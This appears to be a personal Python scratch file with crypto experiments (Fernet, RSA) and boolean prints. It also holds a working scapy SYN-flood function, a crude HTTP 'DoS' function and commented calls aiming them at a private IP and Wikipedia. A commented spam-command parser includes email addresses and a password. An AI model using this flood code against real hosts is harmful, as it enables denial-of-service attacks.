from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import socket
from scapy.all import *

import faker

def writeKey():
    key = Fernet.generate_key()
    with open("key.key", 'wb') as file:
        file.write(key)

def trydos(url):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((url, 80))
    msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url, 80)
    client.send(msg.encode())
    print(client.recv(5100).decode())


def ssyn(target, port):
    ip = IP(dst=target)
    tcp = TCP(sport=RandShort(), dport=port, flags="S")
    raw = Raw(b"X" * 1024)

    packet = ip / tcp / raw

    send(packet, loop=1, verbose=0)


class Sa:
   def hell(self):
       pass

print(True or not True)
print(not(True and not False) or not True)
print(1>-1 and not 8!=6+2)
print(5>3 and 1.5*3<=4)


#ssyn("192.168.11.1", 80)
#trydos(socket.gethostbyname("en.wikipedia.org"))

#loadkey = open("key.key", 'rb').read()
'''
key = Fernet.generate_key()
f = Fernet(key)
x = "&saar . sade@gmail.com"
encryptX = f.encrypt(x.encode())
print(key)
print(encryptX)

print(f.decrypt(encryptX))



privatekey = RSA.generate(1024)
publickey = privatekey.publickey()

encryptor = PKCS1_OAEP.new(publickey)
x = encryptor.encrypt(b"hello")
print(x)
decryptor = PKCS1_OAEP.new(privatekey)
print(decryptor.decrypt(x))

string = "%$mailSpam $mail: lioryehuda03@gmail.com $password: kk $mailList: milkgoal@gmail.com  $subject: dddddddddddddd hello $file: none $filename: hello.jpeg $text: dd sometext"

print("User: " + string.split(" ")[2])
print("Pass: " + string.split(" ")[4])
print(string.split("$subject: ")[1].split(" $file: ")[0])

for i in range(6, string.split(" ").index("$subject:") - 1):
    print(string.split()[i])

print("Message: " + string.split("$text: ")[-1])

print(string.split("$filename: ")[1].split(" $text:")[0])

print(string.split("$file: ")[1].split(" $filename")[0])
'''
